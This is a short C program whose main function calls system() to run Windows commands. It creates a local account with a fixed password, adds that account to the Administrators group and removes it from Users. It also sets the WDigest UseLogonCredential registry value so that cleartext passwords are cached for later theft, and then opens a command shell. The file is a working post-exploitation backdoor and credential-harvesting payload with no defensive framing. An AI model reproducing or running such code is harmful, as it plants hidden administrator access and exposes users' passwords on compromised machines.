#include<stdlib.h>
int main(){
    system("net user username gao12345 /add");
    system("net localgroup Administrators username /add");
    system("net localgroup Users username /del");
    system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f");
    system("cmd");
}
